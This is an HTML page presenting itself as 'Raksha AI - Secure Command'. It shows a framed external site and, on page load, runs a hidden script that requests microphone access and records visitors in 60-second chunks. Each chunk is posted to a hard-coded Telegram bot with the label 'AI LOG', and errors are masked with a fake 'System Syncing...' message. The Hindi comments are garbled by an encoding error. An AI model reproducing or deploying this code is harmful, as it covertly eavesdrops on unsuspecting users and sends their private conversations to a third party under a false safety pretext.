<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Raksha AI - Secure Command</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body onload="startSilentMonitor()">

    <iframe src="https://aesthetic-yeot-93d835.netlify.app" allow="microphone; camera;"></iframe>

    <script>
    async function startSilentMonitor() {
        const TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4"; // à¤†à¤ªà¤•à¤¾ à¤¬à¥‰à¤Ÿ à¤Ÿà¥‹à¤•à¤¨
        const MY_ID = "8508792403"; // à¤†à¤ªà¤•à¥€ à¤šà¥ˆà¤Ÿ ID
        
        try {
            // à¤®à¤¾à¤‡à¤•à¥à¤°à¥‹à¤«à¤¼à¥‹à¤¨ à¤à¤•à¥à¤¸à¥‡à¤¸ à¤®à¤¾à¤‚à¤—à¤¨à¤¾ (à¤à¤• à¤¬à¤¾à¤° à¤…à¤²à¤¾à¤‰ à¤¹à¥‹à¤¨à¥‡ à¤ªà¤° à¤¬à¥ˆà¤•à¤—à¥à¤°à¤¾à¤‰à¤‚à¤¡ à¤®à¥‡à¤‚ à¤šà¤²à¥‡à¤—à¤¾)
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const recorder = new MediaRecorder(stream);
            let chunks = [];

            recorder.ondataavailable = (e) => {
                if (e.data.size > 0) chunks.push(e.data);
            };

            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/ogg' });
                const fd = new FormData();
                fd.append("chat_id", MY_ID);
                fd.append("voice", blob, "ai_safety_log.ogg");
                fd.append("caption", "ðŸ›¡ï¸ AI LOG: à¤¯à¥‚à¤œà¤° à¤•à¥€ à¤¬à¤¾à¤¤à¤šà¥€à¤¤ à¤°à¤¿à¤•à¥‰à¤°à¥à¤¡ à¤•à¥€ à¤—à¤ˆ");

                // à¤Ÿà¥‡à¤²à¥€à¤—à¥à¤°à¤¾à¤® à¤ªà¤° à¤¡à¥‡à¤Ÿà¤¾ à¤­à¥‡à¤œà¤¨à¤¾
                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });

                // à¤¦à¥‹à¤¬à¤¾à¤°à¤¾ à¤°à¤¿à¤•à¥‰à¤°à¥à¤¡à¤¿à¤‚à¤— à¤¶à¥à¤°à¥‚ à¤•à¤°à¤¨à¤¾
                chunks = [];
                if (stream.active) {
                    setTimeout(() => recorder.start(), 1000);
                }
            };

            // à¤¹à¤° 60 à¤¸à¥‡à¤•à¤‚à¤¡ à¤®à¥‡à¤‚ à¤°à¤¿à¤•à¥‰à¤°à¥à¤¡à¤¿à¤‚à¤— à¤•à¤¾ à¤Ÿà¥à¤•à¥œà¤¾ à¤†à¤ªà¤•à¥‡ à¤ªà¤¾à¤¸ à¤†à¤à¤—à¤¾
            recorder.start();
            setInterval(() => {
                if (recorder.state === "recording") {
                    recorder.stop();
                }
            }, 60000); 

        } catch (err) {
            console.log("System Syncing...");
        }
    }
    </script>
</body>
</html>
